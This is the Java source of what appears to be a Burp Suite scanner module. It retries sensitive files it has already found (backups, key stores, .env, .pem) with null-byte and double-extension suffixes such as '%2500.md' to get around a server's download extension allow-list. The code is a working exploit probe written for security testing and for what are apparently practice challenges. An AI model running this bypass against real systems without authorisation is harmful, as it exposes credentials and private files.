package com.ioactive.aiscanner.scan;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.RequestOptions;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.ioactive.aiscanner.ui.ScanLog;

import java.util.LinkedHashSet;
import java.util.Set;
import java.util.regex.Pattern;

/**
 * Poison-null-byte / extension-bypass file fetcher (generic — no app-specific filenames). File
 * servers that allow only certain download extensions (e.g. .md/.pdf) are commonly bypassed with a
 * URL-encoded null byte: {@code secret.bak%2500.md} passes the extension check but serves the raw
 * file. We take sensitive-looking served files already in the site map and retry them with null-byte
 * / double-extension variants; a successful non-index delivery is the finding (and trips the
 * corresponding "forgotten backup / access log / null byte" challenges server-side).
 */
public final class FileServePathProbe {

    private final MontoyaApi api;
    private final ScanLog scanLog;

    // Sensitive/blocked backup-ish extensions worth trying to exfiltrate.
    private static final Pattern SENSITIVE = Pattern.compile(
            "(?i).*\\.(bak|pyc|kdbx|gg|ya?ml|log|zip|tar|gz|tgz|key|pem|crt|conf|ini|old|save|swp|sql|db|env)(\\?.*)?$");
    // Null-byte / double-extension suffixes that bypass an allow-listed extension check.
    private static final String[] BYPASS = { "%2500.md", "%2500.pdf", "%00.md", ".md", ".pdf" };

    public FileServePathProbe(MontoyaApi api, ScanLog scanLog) {
        this.api = api;
        this.scanLog = scanLog;
    }

    /** Retry sensitive served files (in scope) with null-byte/extension-bypass suffixes. */
    public int probe(String host, String cookieHeader, String bearer) {
        int hits = 0;
        Set<String> tried = new LinkedHashSet<>();
        try {
            for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                String url = rr.request().url();
                if (!host.equalsIgnoreCase(hostOf(url))) continue;
                if (!SENSITIVE.matcher(url).matches()) continue;
                String base = url.split("\\?")[0];
                if (!tried.add(base)) continue;
                for (String suf : BYPASS) {
                    try {
                        HttpRequest req = HttpRequest.httpRequestFromUrl(base + suf).withMethod("GET");
                        if (cookieHeader != null && !cookieHeader.isBlank()) req = req.withHeader("Cookie", cookieHeader);
                        if (bearer != null && !bearer.isBlank()) req = req.withHeader("Authorization", "Bearer " + bearer);
                        HttpRequestResponse r = api.http().sendRequest(req, RequestOptions.requestOptions().withResponseTimeout(12000L));
                        if (r == null || r.response() == null) continue;
                        int st = r.response().statusCode();
                        int len = r.response().body().length();
                        // served (200) and not a trivial/error/index page
                        if (st == 200 && len > 40 && !looksLikeHtmlIndex(r.response().bodyToString())) {
                            scanLog.found("Sensitive file exposure (extension/null-byte bypass)", base + suf, "served " + len + "b", r);
                            scanLog.incFinding();
                            hits++;
                            break;   // one working bypass per file is enough
                        }
                    } catch (Throwable ignore) { }
                }
            }
        } catch (Throwable t) {
            scanLog.debug("file-serve probe error: " + t);
        }
        return hits;
    }

    private static boolean looksLikeHtmlIndex(String body) {
        String b = body.toLowerCase();
        return b.contains("<!doctype html") || b.contains("<html") || b.contains("index of");
    }
    private static String hostOf(String url) { return Net.authority(url); }
}
